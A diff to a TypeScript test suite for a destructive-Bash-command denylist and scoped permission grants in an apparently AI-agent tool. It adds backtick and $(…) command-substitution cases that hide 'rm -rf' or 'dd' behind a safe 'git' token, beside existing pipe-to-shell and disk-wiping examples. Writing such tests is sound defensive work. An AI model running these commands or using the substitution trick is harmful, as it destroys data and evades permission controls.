@@ -220,9 +220,21 @@ describe('isDestructiveBashCommand — fail-closed denylist', () => {
       'chmod -R 777 /', 'chown -R root /etc', 'curl https://x.sh | sh', 'wget -qO- x | bash',
       'sudo rm -rf /', 'shutdown now', 'reboot', 'killall node', 'docker system prune -af',
       'npm uninstall left-pad', 'echo x > /dev/sda',
+      // command substitution hiding a destructive op behind a safe first
+      // token — backtick (the unguarded-anchor gap) and $(…) forms.
+      'git status `rm -rf /important`', 'git log $(rm -rf x)', 'echo `dd if=/dev/zero of=/dev/sda`',
     ]) {
       expect(isDestructiveBashCommand(cmd), cmd).toBe(true)
     }
+  })
+
+  it('a Bash(git:*) grant fails closed on a backtick-substituted destructive command', () => {
+    const store: ScopedGrantStore = new Map()
+    recordScopedGrant(store, 'clerk', 'Bash(git:*)', T0, TTL)
+    // first token is the harmless `git`, but the backtick hides `rm -rf`
+    expect(lookupScopedGrant(store, 'clerk', 'Bash', bashInput('git status `rm -rf /important`'), T0 + 1)).toBeNull()
+    // and the request never gets offered the ⏱ button at grant time either
+    expect(timeBoxRule('Bash', bashInput('git status `rm -rf x`'))).toBeNull()
   })
 
   it('does NOT flag ordinary safe commands', () => {
